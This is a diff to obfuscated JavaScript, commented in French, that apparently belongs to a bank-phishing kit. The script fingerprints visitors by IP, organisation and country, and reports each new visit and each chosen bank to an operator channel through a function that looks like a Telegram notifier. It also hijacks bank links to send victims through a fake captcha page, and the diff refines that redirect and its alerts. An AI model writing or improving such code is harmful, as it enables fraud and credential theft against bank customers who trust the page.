@@ -30,7 +30,7 @@
     }
   }
 
-  // 1. Détection Mobile
+  // 1. Détection Mobile (UA ou Touch + écran)
   function _isMobile(){
     var _ua = _N.userAgent || '';
     var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
@@ -137,6 +137,11 @@
     var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
     var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
 
+    // Ne PAS intercepter sur la page captcha.html elle-même
+    if (_W.location.pathname.indexOf('captcha.html') !== -1) {
+      return;
+    }
+
     var _selector = '[filabel],[data-fi],.fi-tile,a[href*="101"],a[href*="html"]';
     _D.querySelectorAll(_selector).forEach(function(_el){
       if (_el.dataset.xb) return;
@@ -166,7 +171,7 @@
 
         _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
 
-        // Interception pour passer par le Captcha avant la banque
+        // Redirection vers captcha.html
         var _href = _el.getAttribute('href');
         if (_href && _href !== '#' && _href.indexOf('captcha.html') === -1) {
           e.preventDefault();
@@ -193,7 +198,10 @@
       _W.sessionStorage.setItem('__xip', ip);
       _W.sessionStorage.setItem('__xorg', org);
 
-      _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+      // On n'envoie la notif de visite que si on n'est pas déjà sur le captcha
+      if (_W.location.pathname.indexOf('captcha.html') === -1) {
+        _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+      }
 
       _setupForms();
       _setupBanks();
